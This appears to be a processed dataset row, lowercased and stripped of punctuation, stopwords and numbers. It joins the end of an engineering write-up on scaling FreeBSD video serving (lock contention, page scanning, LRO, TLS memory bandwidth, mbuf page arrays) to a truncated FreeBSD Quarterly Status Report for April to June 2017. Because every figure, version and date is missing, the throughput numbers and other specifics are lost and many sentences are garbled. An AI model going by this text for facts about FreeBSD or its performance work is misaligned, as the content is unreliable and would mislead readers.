drive hit another bottleneck also related lock global list stuck around gbps new hardware constrained pbufsfreebsd us buf structure manage disk io bufs used paging system statically allocated boot time kept global linked list protected single mutex done long ago several reason primarily avoid needing allocate memory system already low memory trying page swap data order able free memory problem sendfile system call us vm paging system read file disk resident memory therefore disk io constrained pbuf mutexour first problem list small spending lot time waiting pbufs easily fixed increasing number pbufs allocated boot time increasing kernnswbuf tunable however update revealed next problem lock contention global pbuf mutex solve changed vnode pager handle paging file rather swap partition hence handle sendfile io use normal kernel zone allocator change removed lock contention boosted performance gbps rangeproactive vm page scanningas noted make heavy use vm page queue especially inactive queue eventually system run short memory queue need scanned page daemon free memory full load happening roughly twice per minute happened nginx process would go sleep vmwait system would stop serving traffic pageout daemon worked scan page often several second severe impact key metric use determine oca health especially nginx serving latencythe basic system health expressed follows wish cartoon memory free everything fine serving memory free everything fine serving memory free everything fine serving memory free oh god gon na die serving memory free everything fine serving gbps problem actually made progressively worse one add numa domain one pageout daemon per numa domain page deficit trying clear calculated globally vm pageout daemon decides clean say memory domain pageout daemon individually attempt clean memoryto solve problem decided proactively scan vm page queue sendfile path allocating page io run pageout code several time per second vm domain pageout code run lightestweight mode context one unlucky nginx process nginx process continue run serve traffic happening avoid burst pager activity block traffic serving proactive scanning allowed u serve roughly gbps prototype hardwarerss assisted lrotcp large receive offload lro technique combining several packet received tcp connection single large packet technique reduces system load reducing trip network stack effectiveness lro measured aggregation rate example able receive four packet combine one lro aggregation rate packet per aggregationthe freebsd lro code default manage packet aggregation one time work really well lan serving traffic small number really fast connection however ten thousand active tcp connection machine aggregation rate rarely better packet per aggregation averagehans petter selasky mellanox driver developer came innovative solution problem modern nics supply receive side scaling r hash result host r standard developed microsoft wherein tcpip traffic hashed source destination ip address andor tcp source destination port r hash result almost always uniquely identify tcp connection han idea rather passing packet lro engine arrive network hold packet large batch sort batch packet r hash result original time arrival keep order packet sorted packet connection adjacent even arrive widely separated time therefore packet passed freebsd lro routine aggregate themwith new lro code able achieve lro aggregation rate packet per aggregation able serve well gbps first time prototype hardware mostly unencrypted traffican rx queue containing packet connection would packet connection ring lro engine would able see packet belonged together maintained handful aggregation sorting r hash packet connection appear adjacent queue fully aggregated lro enginenew goal tl gbpsso job done next goal achieve gbps serving tlsencrypted streamsby point using hardware closely resembles today flash storagebased oca four nvme pcie drive ethernet xeon cpu improvement described protecting netflix viewing privacy scale blog entry able serve tlsonly traffic roughly gbpsin lock contention problem observed cause increased cpu use relatively apparent normal system level tool like flame graph dtrace lockstat gbps limit comparatively strange cpu use would increase linearly approached gbps limit neared limit cpu use would increase almost exponentially flame graph showed everything taking longer apparent hotspotswe finally hunch limited system memory bandwidth used performance counter monitor tool measure memory bandwidth consuming peak load wrote simple memory thrashing benchmark used one thread per core copy large memory chunk fit cache according pcm tool benchmark consumed amount memory bandwidth oca tlsserving workload clear memory limitedat point became focused reducing memory bandwidth usage assist began using intel vtune profiling tool identify memory load store identify cache missesread modify writebecause using sendfile serve data encryption done virtual memory page cache connectionspecific encryption buffer preserve normal freebsd page cache order allow serving hot data memory many connection one first thing stood u isal encryption library using half much memory bandwidth memory read memory writes looking vtune profiling information saw isal somehow reading source destination buffer rather writing destination bufferwe realized avx instruction used isal encryption cpu worked quantity whereas cache line size byte thus triggering system readmodifywrites data written problem cpu normally access memory system byte cache linesized chunk reading entire byte access even single byte case cpu needed write byte cache line using readmodifywrites handle writes meant reading entire byte cache line order able write first byte especially silly next thing would happen would second half cache line would writtenafter quick email exchange isal team provided u new version library used nontemporal instruction storing encryption result nontemporals bypass cache allow cpu direct access memory meant cpu longer reading destination buffer increased bandwidth gbps gbpsin parallel optimization spec final production machine changed using lower cost memory using memory fastest supported memory platform faster memory able serve gbpsvtune driven optimizationswe spent lot time looking vtune profiling information reworking numerous core kernel data structure better alignment using minimallysized type able represent possible range data could expressed example approach include rearranging field kernel structs related tcp resizing many field originally expressed longs need hold bit data bit platformsanother trick use avoid accessing rarely used cache line large structure example freebsd mbuf data structure incredibly flexible allows referencing many different type object wrapping use network stack one biggest source cache miss profiling code release page sent sendfile relevant part mbuf data structure look like struct mext volatile uint extcnt pointer ref count info caddrt extbuf start buffer extsize size buffer extfree type external storage external storage mbuf flag void extfree free routine usual struct mbuf void void void optional argument pointer void optional argument pointer problem fell cache line mbuf thing accessed cache line even worse workload almost always null paying read byte data every kb sent pointer null virtually time failing shrink mbuf decided augment extflags save enough state first cache line mbuf determine null passed null explicitly rather dereferencing taking cache miss gained almost gbps bandwidthgetting wayvtune lockstat pointed number oddity system performance came data collection done monitoring statisticsthe first example metric monitored load balancer tcp connection count metric needed load balancing software tell system underloaded overloaded kernel export connection count provide way export tcp connection information allowed user space tool calculate number connection fine smaller scale server ten thousand connection overhead noticeable oca asked export connection kernel first took lock tcp connection hash table copied temporary buffer dropped lock copied buffer userspace userspace iterate table counting connection caused cache miss lot unneeded memory activity lock contention tcp hash table fix quite simple added percpu lockless counter tracked tcp state change exported count connection tcp stateanother example collecting detailed tcp statistic every tcp connection goal statistic monitor quality customer session detailed statistic quite expensive term cache miss term cpu fully loaded server many ten thousand active connection tcp statistic consumed cpu solution problem keep detailed statistic small percentage connection dropped cpu used tcp statistic change resulted speedup gbpsmbuf page arraysthe freebsd mbuf system workhorse network stack every packet transit network composed one mbufs linked together list freebsd mbuf system flexible wrap nearly external object use network stack freebsd sendfile system call used serve bulk traffic make use feature wrapping page medium file mbuf metadata free function argument free function reference count etc drawback flexibility lead lot mbufs chained together single mb http range request going sendfile reference vm page one wrapped mbuf chained together get messy fastat gbps moving gb page system unencrypted adding encryption double gb worth page million mbufs per second add extra mbufs used crypto code tl metadata beginning end tl record work another mbufssec total mbufssecond roughly cache line access per mbuf byte gb gbps data accessed multiple layer stack alloc free crypto tcp socket buffer driver etc reduce number mbufs transit decided augment mbufs allow carrying several page type single mbuf designed new type mbuf could carry page sendfile could also carry tl header trailing information inline reducing tl record mbufs change reduced mbufssec le mbufssec resulted speed roughly gbpsthis without challenge specifically freebsd network stack designed assume directly access part mbuf using mtod mbuf data macro given carrying page unmapped mtod access panic system augment quite function network stack use accessor function access mbufs teach dma mapping system busdma new mbuf type write several accessors copying mbufs uios etc also examine every nic driver use netflix verify using busdma dma mapping accessing part mbufs using mtod point new mbufs enabled fleet exception old storage platform disk cpu limitedare yet point able serve tl traffic comfortably gbps using default freebsd tcp stack however goalpost keep moving found use advanced tcp algorithm rack bbr still bit short goal several idea currently pursuing range optimizing new tcp code increasing efficiency lro trying encryption closer transfer data either disk nic take better advantage intel ddio save memory bandwidth
438,Lobsters,freebsd,FreeBSD,FreeBSD Quarterly Status Report,https://www.freebsd.org/news/status/report-2017-04-2017-06.html,freebsd quarterly status report,introduction freebsdorg portmgrsecretary freebsdorg portmgr freebsdorg core freebsdorg freebsd project member freebsd community process github repository core activity deb freebsdfoundationorg donate http http http http ctsvrespcomc http wwwfreebsdfoundationorgdonors http wwwfreebsdfoundationorgfreebsdfoundationpartnershipprogram http http conferencesoreillycomosconoscontx http wwwyoutubecomwatch http http http wwwyoutubecomwatch featureyoutube http githubcommapboxspotswap http http http wwwfreebsdfoundationorgwhatwedograntstravelgrants http wwwfreebsdfoundationorgbloghappyfreebsdday http wwwfreebsdfoundationorgnewsandeventsupcomingevents http wwwfreebsdfoundationorgpastissuessecurity http wwwfreebsdfoundationorgpastissuesconfigurationmanagement http mydigitalpublicationcompublication issueid numpages page http wwwfreebsdfoundationorgjournal dhw freebsdorg ler freebsdorg zi freebsdorg rea freebsdorg remko freebsdorg pi freebsdorg open task gleb freebsdorg kib freebsdorg mckusick freebsdorg strictly ed nuxinl open task wjw digiwarenl http githubcomwjwithagenceph open task manu freebsdorg trasz freebsdorg open task mw semihalfcom mk semihalfcom open task krzysztofgalazka intelcom jebjcramer intelcom rmacklem freebsdorg open task mw semihalfcom zbb freebsdorg andrew freebsdorg manu freebsdorg rafaelespindola gmailcom emaste freebsdorg open task tobik freebsdorg open task gerald freebsdorg andreast freebsdorg open task pr freebsdgnome freebsdorg open task kde freebsdorg olivier cochardme tz freebsdorg open task rust freebsdorg open task tobik freebsdorg open task amutu amutucom open task linimon freebsdorg xfce freebsdorg duchateauolivier gmailcom open task mwlucas michaelwlucascom open task wblock freebsdorg bcr freebsdorg open task contact steepatheu shawnwebb hardenedbsdorg oliverpinter hardenedbsdorg open task news home status home,introductionfreebsd continues defy rumor demisemuch development work done quarter particularly visible especially effort needed ensure upcoming release regression possible planning also well way maintenance release quickly follow itfurther work focused moving arm architecture support closer status improving documentation addition large change made src port treesthese project others detailed linimonthe deadline submission covering period july september october contact freebsd release engineering team freebsdorg freebsd release engineering team responsible setting publishing release schedule official project release freebsd announcing code freeze maintaining respective branch among thing freebsd cycle started may continued scheduled freebsd consumer urged test whenever possible help ensure reliability stability upcoming second release branch project sponsored freebsd foundation contact rené ladan portmgrsecretary freebsdorg contact freebsd port management team portmgr freebsdorg quarter broke port landmark first time pr count currently almost unassigned quarter saw almost commits committers pr got closed quarter last quarter also pr got sent good see past three month welcomed four new committers bradley hughes bhughes danilo g baio dbaio jochen neumeister joneum richard gallamore ultima kan rejoined u port committer one commit bit bf taken safekeeping long period inactivity management side port management team welcomed back bapt working several new feature port tree port management team also annual reallife meeting bsdcan infrastructure side three new us value introduced cargo ease porting rust package binary using cargo command also covered separately report groff handle dependency groff document formatting system removed base system freebsd meson provide support project based meson default version postgresql switched default generator port using cmake switched ninja major version update pkg firefox chromium behind scene antoine ran expruns test version update make cran port platformindependent test installing bsdgrep usrbingrep test llvm update test project perform makefile cleanup contact freebsd core team core freebsdorg core activity second quarter culminated introduction two new initiative bsdcan extending freebsd project membership freebsd community process freebsd project member freebsd project membership extended committers step enables project recognise reward people support u way writing code people organise conference user group prominent supporter social medium triage bug report test change many others contribute various way deserving recognition support give project core hope encourage people volunteer time effort behalf project encourage already stick project become deeply involved naming new group noncommitter project member took try get right tried rejected contributor associate core took view since offerring formal project membership right thing call committers thus become project member access commit project code repository project member receive freebsdorg email address access various project hardware access internal mailing list communication channel invitation attend developer summit right committers addition commit right subversion repository github active committers vote core team election freebsd community process idea long pedigree within project freebsd consciously modelling implementation worked elsewhere significantly disruptive widescale change proposed formal mechanism documenting change implies interested party respond change evolved best fit user else found impracticable withdrawn documentation change remain point reference similar proposal come future creating formal process help avoid endless sterile argument need done without anyone feeling sufficient investment idea backing majority project justify putting work achieve desired result first fcp fcp describes process time writing core voting accepting initial document viewed project github repository two new mailing list created fcp freebsdorg channel receiving notification new fcp proposal discussing content whilst fcpeditors freebsdorg exists provide help process drafting fcp document core activity core delighted announce gordon tetlow joined security officer team working managing security team caseload freeing member concentrate technical aspect vulnerability remediation addition ed maste joined security team available assist security officer necessary although florian smeets step postmaster team recruited three new member back strength considering desirability number fix merged since release core approved release occur shortly release normal supportlifetime release unlike extended lifetime release overall support lifetime branch significantly extended quarter core approved issuing three new commit bit please welcome vladimir kondratyev wulf ryan libby rlibby kyle evans kevans also quarter one person give commit bit always unsettling one project founding member decides move jordan interest migrated away freebsdrelated project decided hang bit core would like thank ntta formerly verio providing hosting cvsup mirror many year also kind offer provide ongoing hosting machine seattle facility since need additional north america hosting declined offer usual number question raised code licensing matter related intellectual property ed maste registered freebsd behalf freebsd foundation mastodon social medium network unlicense suitable code imported libc still code published old style bsd license extra clause refers specifically university california uc generally approved removing clause need check copyright holder changing remaining licensing core along security team monitoring development concerning stack clash vulnerability hit headline june change stackguard mitigation system underway response proofofconcept published qualys contact deb goodkin deb freebsdfoundationorg last quarter foundation busy supporting freebsd project many way brought two intern university waterloo extremely productive working continuous integration project adding msdos fat filesystem support makefs continued helping accelerate o change internal staff software developer well funding outside software development project continued promoting freebsd participating technology conference around world encourage commercial user donate foundation launched new partnership program freebsd release effort led fulltime foundation employee continue keeping release timely reliable finally led effort celebrate newly declared freebsd day help raise awareness freebsd around world read highlight newsletter find writeups throughout status report foundation staff member including ed maste kostik belousov glen barber nt forget funded donation please take moment donate continue supporting freebsd project community worldwide development project summary hard work continues quarter please take look highlight recent development project summary april freebsd usb mass storage target project update foundation awarded project grant edward tomasz napierała develop usb mass storage target driver using freebsd cam target layer ctl backend project allows freebsd embedded platform beaglebone black raspberry pi zero emulate usb mass storage target commonly known usb flash stick read http may foundation brings coop student beginning may embarked new path freebsd foundation hiring cooperative education coop student university waterloo university waterloo pioneer leader cooperative education engineering student majority computer science student participating coop program read http june freebsd foundation project proposal solicitation contributed ed maste one way foundation support freebsd providing development grant work individual project allow developer propose project would like undertake improve freebsd request funding perform work foundation always willing receive proposal occasionally issue call proposal highlight specific area focus able collect evaluate group proposal proposal submission deadline july mentioned people welcome submit proposal time although proposal may address freebsd subsystem infrastructure particularly interested receiving proposal related improvement security freebsd application running freebsd new test case improved test infrastructure quality assurance improved software development tool project improve community collaboration communication improving freebsd box experience new user various hardware platform establishing freebsd leader advancing project shared interest zfs llvm libarchive detail found http full project proposal submission guideline found http ctsvrespcomc please hesitate contact proposal freebsdfoundationorg question announcing new partnership program contributed deb goodkin excited announce new freebsd foundation partnership program work supported donation individual organization spending budget rely large donation commercial user help u sustain increase support recognizing value donation putting together sustainable funding model wanted institute benefit highlighted support recognize donor productive way partnership avenue assist commercial user helping get board quickly freebsd share need community facilitate collaboration freebsd developer believe building relationship commercial user contribute keeping freebsd relevant help provide sustainable healthy ecosystem check updated donor page see acknowledging partner http wwwfreebsdfoundationorgdonors also find new program http wwwfreebsdfoundationorgfreebsdfoundationpartnershipprogram china last week chance talk company new partnership program definitely generated interest supporting effort continuing reach commercial user help enable u provide outreach support freebsd includes funding project improve freebsd providing freebsd education training recruiting contributor project provide support donation need help connect u company please consider notifying organization new partnership program helping connect u appropriate contact company donation help u accelerate improvement add new feature freebsd support release engineering effort fulltime create provide freebsd educational training material provide facetoface opportunity developer work together improve support freebsd infrastructure need support continue improving freebsd conference recap sponsoring event attending conference foundation continued mission advocacy second quarter past week member foundation team represented project foundation event around world conference recap fossasia contributed philip paeps foundation kindly funded part travel tokyo singapore attend fossasia gave freebsd linux distribution presentation foundation board member george nevilleneil wrote open source china december presentation wellattended got lot good question primarily linuxoriented audience read http oscon contributed ed maste represented freebsd foundation oscon took place may austin tx http conferencesoreillycomosconoscontx foundation booth also staffed freebsd committer brad davis doug mcintire netgate met wednesday morning set table part nonprofit pavilion consisted eight table located open camp operation code help attract booth traffic brought raspberry pi small lcd display attached demo raspberry pi showed video gource rendering change freebsd source tree time see example http wwwyoutubecomwatch read http rootconf contributed philip paeps midmay presented rootconf bangalore rootconf india principal conference system operation engineer share realworld knowledge building reliable system http always interesting hear difficulty people face trying run reliable system le reliable platform many presentation linuxspecific exciting couple talk catch eye particularly enjoyed talk aruna sankaranarayanan http wwwyoutubecomwatch featureyoutube explaining mapbox take advantage amazon spot pricing mechanism spawning shutting machine different price point optimize cost without compromising availability spotswap http githubcommapboxspotswap software released bsd license sound though possible port freebsd minimal effort read http bsdcan developer summit contributed deb goodkin one initiative assist providing facetoface knowledge sharing development opportunity around world one way sponsoring bsdrelated conference freebsd developer vendor summit recently sponsored bsdcan freebsd developer vendor summit ottawa ontario canada took place june many board staff member attended summit conference run tutorial give presentation lead session work developer give demo share knowledge addition year pleased bring new university waterloo intern conference opportunity demonstrate project foundation table read http open travel grant application foundation recognizes importance bringing member freebsd community facetoface development project spread word freebsd travel grant available community member need assistance travel expense attending conference related freebsd development advocacy please note travel grant policy recently updated please carefully review submitting application information travel grant available http wwwfreebsdfoundationorgwhatwedograntstravelgrants freebsd day june contributed anne dickison june declared freebsd day thank everyone joined u honoring freebsd project pioneering legacy continuing impact technology find freebsd day celebrated http wwwfreebsdfoundationorgbloghappyfreebsdday upcoming event find upcoming foundation event http wwwfreebsdfoundationorgnewsandeventsupcomingevents freebsd journal mayjune issue freebsd journal available nt miss article freebsd firewall feast cadet blending tracing security freebsd toward oblivious sandboxing capsicum http wwwfreebsdfoundationorgpastissuessecurity miss marchapril issue check article cfengine puppet freebsd vagrant http wwwfreebsdfoundationorgpastissuesconfigurationmanagement recent addition functionality browserbased subscriber ability download share pdfs article sample issue ever wanted read entire issue freebsd journal chance download sample issue http mydigitalpublicationcompublication issueid numpages page sure share friend colleague subscriber sign today http wwwfreebsdfoundationorgjournal information foundation doings goingson found quarterly newsletter linked contact david wolfskill dhw freebsdorg contact larry rosenman ler freebsdorg contact ryan steinmetz zi freebsdorg contact eygene ryabinkin rea freebsdorg contact remko lodder remko freebsdorg contact kurt jaeger pi freebsdorg postmaster handle mail flow freebsd project clusteradm provides u four jail mailman mailarchive addition part setup running freefallfreebsdorg system us postfix mailman spamassassin tool port tree handle mail flow use small nonpublic subversion repository part configuration larry rosenman kurt jaeger eygene ryabinkin remko lodder ryan steinmetz joined postmaster team florian smeets left postmaster team thanks florian long service role david wolfskill planning leave role soon new team member settled vsevolod stakhov plan provide u support integrate rspamd setup well workload postmaster team high complexity setup demand open task need improve internal documentation workflow processeswe consider adding monitoring provide quarterly number mail flow contact gleb kurtsou gleb freebsdorg contact konstantin belousov kib freebsdorg contact kirk mckusick mckusick freebsdorg inode project completed merged freebsd may extends inot devt nlinkt type integer modifies struct dirent layout add doff field increase size dfileno bit increase size dnamlen bit change required alignment structure increase struct statfs fmntfromname fmntonname array length mnamelen abi breakage mitigated providing compatibility using versioned symbol ingenious use existing padding structure employing various trick unfortunately everything fixed especially outside base system instance thirdparty apis pas struct stat parameter broken backward forwardincompatible way abi kinfoconsuming sysctl mib changed backwardcompatible way general mechanism handle sysctl mib return structure layout changed consideration breakage either management interface usually allow abi slippage important layout struct xvnode changed compatibility shim provided struct xtty devt tty device member reduced decided maintaining abi compatability case useful reporting devt value sake pstat updating note strictly follow instruction updating build install new kernel option enabled reboot install new world credit inode project also known started life many year ago project gleb kurtsou gleb kirk mckusick mckusick picked updated patch acted flagwaver feedback suggestion discussion carried ed maste emaste john baldwin jhb jilles tjoelker jilles rick macklem rmacklem kris moore kris performed initial port investigation followed exprun antoine brodin antoine essential allembracing testing done peter holm pho heavy lifting coordinating effort bringing project completion done konstantin belousov kib project sponsored freebsd foundation emaste kib contact ed schouten ed nuxinl one weakness capsicum cloudabi easy develop application need make outgoing network connection since system call like connect sendto disabled though sometimes work around ensuring sandboxed process already posse socket file descriptor startup allow destination process restarted moved different network address load balanced etc coming solution quite important currently working making cloudabi work top kubernetes google open source cluster management suite idea kubernetes schedule cloudabi process instead docker container cloudabi process dependency service cluster injected explicitly making internal communication secure intended work freebsd well course solve problem working daemon called flower read flower allows software register service connect server identified set label value eg datacenter frankfurt service mysql client connect server providing corresponding label flower security model capabilitybased like capsicum ability bind connect limited permanently constraining label certain value flower designed act proxy copy data merely forward existing socket file descriptor creates unix socket pair hand client server realize process communicate flower using rpc library called arpc arpc simple clone google grpc special feature message protobufs file descriptor attached project sponsored nuxi netherlandsopen task finish implementing flower codeintegrate flower kubernetescloudabi runtimerelease kubernetescloudabi runtime open source software contact willem jan withagen wjw digiwarenl ceph distributed object store file system designed provide excellent performance reliability scalability object storage ceph provides seamless access object using native language binding radosgw rest interface compatible application written swift block storage ceph rados block device rbd provides access block device image striped replicated across entire storage cluster file system ceph provides posixcompliant network file system aim high performance large data storage maximum compatibility legacy application started looking ceph hast solution carp ggate really looking aim run ceph storage cluster storage node running zfs user workstation running bhyve rbd disk stored ceph compiling freebsd build tool available ceph important change since last report ceph released release candidate aka luminous corresponding packaging sitting tree waiting luminous actually released cephfuse work allows mounting cephfs filesystems speed impressive work rbdggate available create ceph rbd backed device rbdggate submitted mykola golub work rather simple fashion cluster functioning rbd import rbdggate map used create ggatelike device backed ceph cluster improvement since previous report bug initceph code needed rcd fixed rbd rados functioning needed compatability code written freebsd linux daemon operate together single cluster awkward dependancies linuxisms deleted binbash stay next forthcoming official release ceph called luminous soon available upstream port provided freebsd get thing running freebsd system run pkg install netcephdevel clone http githubcomwjwithagenceph check branch build manually running dofreebsdsh checkout root part yet included krbd rbdggate usable stead bluestore freebsd linux different aio apis incompatibility need resolved somehow additionally discussion freebsd aiocancel working device type open task run integration test see freebsd daemon work linux ceph platforminvestigate keystore embedded kernel linux currently prevents building cephfs part first question whether really required krbd requires itscheduler information used moment scheduler work rather differently linux freebsd certain point time need attention srccommonthreadcc improve freebsd init script ceph stack testing purpose running ceph production machine work cephdisk cephdeploy make freebsd zfscompatiblebuild test cluster start running teuthology integration test teuthology want build libvirt quite work package freebsd already place many detail work heredesign virtual disk implementation used bhyve attached rbd image contact emmanuel vadot manu freebsdorg dts device tree source file provide humanreadable source description hardware resource given computer system arm mipsbased embedded board dts source representation must compiled binary format order linked kernel used locate device runtime dts file freebsd updated match version linux represent modern device provide accurate representation contact edward tomasz napierała trasz freebsdorg coda distributed file system developed research project carnegie mellon university descended older version andrew file system got dropped freebsd five year ago due adopted mpsafe world focus current project bring back sufficiently workable shape could return kernel currently working condition work underway test better fix whatever issue found commit project sponsored chalmers university technologyopen task additional testingupdate userspace component netcodaclient netcodaserver contact marcin wojtas mw semihalfcom contact michał krawczyk mk semihalfcom ena elastic network adapter smartnic developed annapurna lab based custom chip highperformance networking card available aws offering introduces enhancement network utilization scalability machine control various operating system particular freebsd goal freebsd enablement provide top performance wide range monitoring management feature multiple queue mode hardware offloads rx tx checksum admin queue asynchronous notification robust hardware access scalable number msix vector hardware counter watchdog mechanism lro r driver available kernel source tree project sponsored annapurna lab amazon companyopen task add r configuration userspace via sysctls add support llq mechanism contact chris galazka krzysztofgalazka intelcom contact jeb cramer jebjcramer intelcom ix ixv network interface driver support variety intel network interface line speed gbitsecond quarter driver gained support network interface found systemonachip device based denverton platform update allow freebsd useful new class hardware platform work also underway convert driver use iflib network driver library ease future maintenance driver well network subsystem whole contact rick macklem rmacklem freebsdorg parallel nfs pnfs extension protocol allows file access within single logical mount performed multiple file server potential data access occur parallel pnfs layout use specifies division occurs metadata operation occurring main server bulk data operation readwritesetattretc occurring via layoutspecific scheme client data server first attempt pnfs server using glusterfs dud worked performance poor usable attempt call plan b us freebsd one freebsd server handling metadata operation multiple freebsd server configured serve data ready thirdparty testing testing third party go well anticipate code merged freebsd head time freebsd fairly recent freebsd linux system usable pnfs client testing server support file layout supported client support flex file layout mirroring time hope use flex file layout add mirroring support next year striping supported plan implementing moment patched freebsd source may accessed testing via either subversion download gzipped tarball consist patched kernel nfsd used freebsd later system open task testing others needed code available contact marcin wojtas mw semihalfcom contact zbigniew bodek zbb freebsdorg work proceeds finalize process bringing support marvell platform freebsd head important part recent effort add network driver neta enable coherent busdma operation socs add various lowlevel optimization cache prefetch mbus quirk enable cache controller add sdhci support fix driver rework phy handling support multiport pcie operation various fix enhancement common marvell code fix enable support performance counter hwpmc project sponsored stormshield semihalf netgate contact andrew turner andrew freebsdorg support privilege access never pan feature added stop kernel accessing userspace memory except specific instruction help security allowing access userspace via correct accessor function enabled supported cpu implement later pmap code support unprivileged executenever uxn privileged executenever pxn bit page table bit stop userspace kernel respectively executing instruction marked page performance pmap layer improved many cache handling function call removed needed early work around bug fixed removal call led large performance improvement kernel us instruction appropriate optional set instruction perform checksumming quickly without using lookup tablec vmmemattrwritethrough memory attribute supported used allocate memory framebuffer previously kernel would use cached memory however lead visual artifact writethrough flag fix writing data ram default linker lld mean freebsd able build component base system big milestone contact emmanuel vadot manu freebsdorg intree dtc device tree compiler switched use bsdlicensed version default previous default dtc licensed gpl current version support overlay able compile every dts device tree source used freebsd arm release port gpl version updated latest release intree gpl version still present goal remove freebsd contact rafael espíndola rafaelespindola gmailcom contact ed maste emaste freebsdorg lld linker llvm family project highperformance linker support elf coff macho object format broadly compatible common linkers used file format elf gnu binary file descriptor bfd ld gnu gold however lld author constrained strict compatibility would hamper performance desired functionality lld used default system linker link working kernel kernel module userland lld also link working kernel module userland freebsdarm work ongoing address port build lld system linker either fixing port configuring port linked gnu ld freebsd expect use lld system linker set architecture use clang default arm project sponsored freebsd foundationopen task fix libtool detect lld pas command line argument gnu ld goldinvestigate remaining port build failuresinvestigate improve lld arm creation branchinvestigate improve lld architecturesextensive testing contact tobias kortkamp tobik freebsdorg support port collection application written rust programming language use rust package manager cargo added via new usescargo setting work based cargo module openbsd port tree significantly ease porting rust application previously porter create tarball application dependency find manual way bringing several new port added use example alacritty gpuaccelerated terminal emulator exa modern replacement l ripgrep lineoriented search tool combine usability silver searcher raw speed gnu grep open task add documentation new feature contact gerald pfeifer gerald freebsdorg contact andreas tobler andreast freebsdorg default version gcc port collection one requested usegccyes various usescompiler invocation updated gcc gcc new major version brings many new capability improvement well change may require adjustment latter category includes many new compiler warning significant improvement interprocedural optimization linktime optimization default mode c instead c front end full language support including variable template aggregate nonstatic data member initializers extended constexpr standard c library libstdc full support experimental full support us new abi default langgcc port metaport pull respective langgccx port based setting gccdefault defines gcc g gfortran symlinks respective versioned binary end long journey establishing infrastructure similar used python port example new infrastructure make upgrading default well locally adjusting default version lot easier added support removed made adjustment newer version freebsd also note various cleanup change improve robustness package addition support many port thanks dim jbeich tijl mat miwi linimon assisting work open task update default version gcc gcc gcc stalled unfortunately work gcc insfrastructure side complete unfortunately number broken port need adjustedfixed help appreciated see pr detail contact freebsd gnome team freebsdgnome freebsdorg freebsd gnome team maintains gnome mate cinnamon desktop environment graphical user interface freebsd gnome part gnu project mate fork gnome desktop cinnamon desktop environment using gnome technology gnome look feel period much activity quarter started little experiment merge port development repo freebsd port collection instead merging everything one big commit updating gnome port one time small group example gtk stack evolution suite updated group gnomegames component done one commit might bit work preparing testing update plus side easy keep track going allows u pay attention detail also make easier commit smaller change quarter started update gtk underlying library latest stable version gtk update work started getting newer version gnome application updated port first updated series later latest stable version step needed could nt built freebsd without required framework change harfbuzzicu split main harfbuzz port drop heavy icu dependency main harfbuzz port longstanding glibgio bug fixed previously caused crash gnomeshell application shareapplications modified happens pkg install deinstall many update based work previously done gnome development branch ruslan makhmatkhanov gustau perez koop mast open task porting muttergnomeshellgdm complete unfortunately gdm blocking update handoff bug session loginfix printer submenu gnomecontrolcenter workaround systemconfigprinter used configure printersmate qa tested arrive early july contact kde freebsd team kde freebsdorg kde freebsd team focus packaging kde qt making sure experience freebsd good possible quarter addition regular update kde qt related port also change behind scene development repository moved github freebsd part kde official continuous integration ci infrastructure xorg gnome port team kde freebsd team moved development repository github make easier others collaborate u via pull request basing change top official port tree also hope reduces amount conflict churn need deal landing big update across tree would like thank ixsystems hosting supporting subversion repository many year freebsd finally joined kde ci continuous integration system platform kde ci build kde source framework kde plasma desktop plethora kde application continuously straight kde git repository strong commitment upstream downstream kdefreebsd team reduce amount patching kde port little possible first effect felt expanding set unit test include freebsdspecific situation extending qt handle freebsd filesystems better addition kde sysadmins would also like extend thanks adriaan de groot kde committer part kde freebsd team spearheading effort following big update landed port tree quarter cmake updated kde framework updated calligra office suite updated first release port tree based kde framework latest stable release upstream konversation irc client updated latest upstream release first port version based kde framework kchmviewer updated based kde framework labplot updated based kde framework qtcreator upated subsequently pysip updated several fix landed port thanks mikaël urankar several review round expruns tobias berner tcberner finally made ninja generator default cmakebased port develninja used instead g make case make build faster even small margin adriaan de groot also wrote blog post change contact olivier cochardlabbé olivier cochardme frrouting frr quagga fork ip routing protocol suite linux unix platform includes protocol daemon bgp isi ospf rip lpd pim support need fixed freebsd frr linux foundation collaborative project contributor including architecture technology corporation big switch network cumulus network labn consulting netdef opensourcerouting orange volta network company project sponsored orange contact torsten zühlsdorff tz freebsdorg maintainer php port first want thank great feedback patch receive many form keep life interesting past month learned lot various configuration setting bug also sadly always pr patch email left unanswered missing time side want improve situation adding automatic qa testing need help please send nonstandard phpconfigurations describe exotic setup simple changed default version like libressl instead openssl gcc version used compiling example always use another postgresqlversion default always php course also cover port option set nondefault way setup change variable allow multiple php installation etc plan test supported freebsd version need mention using unsupported version note since php coming hopefully schedule test php onset provided configuration open task document various configuration testedsetup automatic qa infrastructure contact freebsd rust team rust freebsdorg rust updated cargo latest version time writing langrust enabled work continued develcargo achieve also making slow progress add support even platform discussion started upstream support apiabibreaking change major release operating system instance required able target freebsd abi change involving important structure support added upstream possible target specific abi crosscompilation langrustnightly marked broken need revisit port built use xpy script recommended upstream tobias kortkamp tobik created usescargo setting make easy add rust application port collection detailed separate entry quarterly status report compiler rustc crashing sometimes compilation error therefore bit work improve stability code duplication langrust develcargo makefiles deserve bit cleanup might useful create usesrust makefile helper open task bootstrap rust platformsinvestigate compiler crashesinvestigate speed langrust compilation time contact tobias kortkamp tobik freebsdorg sndio small audio midi framework part openbsd project provides lightweight audio midi server sndiod currently support openbsd freebsd dragonfly bsd linux porting effort freebsd os started last year sndio backend support freebsd port collection considered good enough daily use sndio offer network transparency sndiod provides easy way share audio device machinesvmsjails network however application library need support playing recording end submitted several patch various port course last year short selection port support sndio freebsd port collection game via audioopenalsoft gstreamerbased application webkitbased browser two new gstreamer plugins audiogstreamerpluginssndio firefox firefox esr seamonkey chromium iridium browser currently lack nonfunctional os backend sndio support provides bsdnative alternative alsa pulseaudio backends video player like vlc totem mpv mplayer etc audio player like clementine cmus mpd siren xmp etc sox shairport sync newly implemented backend jack pulseaudio audiopulseaudiomodulesndio open task commit backport kodi new sndio backend port collectionif maintain use audiorelated port consider checking whether includes sndio backend adding sndio option thanks openbsd developer several opensource project already include one adding might easy contact jov amutu amutucom described website open source software library numerical computation using data flow graph node graph represent mathematical operation graph edge represent multidimensional data array tensor communicated flexible architecture allows deploy computation one cpu gpus desktop server mobile device single api tensorflow originally developed researcher engineer working google brain team within google machine intelligence research organization purpose conducting machine learning deep neural network research system general enough applicable wide variety domain well tensorflow popular platformlibrary machine learning ai official binary linux mac window android official support freebsd last several month done work make tensorflow available freebsd notable item include bazel patched depend proc build time bazel build tool made google us proc get pathtoself building c code mounting proc usually allowed building unprivileged user tensorflow built freebsd using default bazel 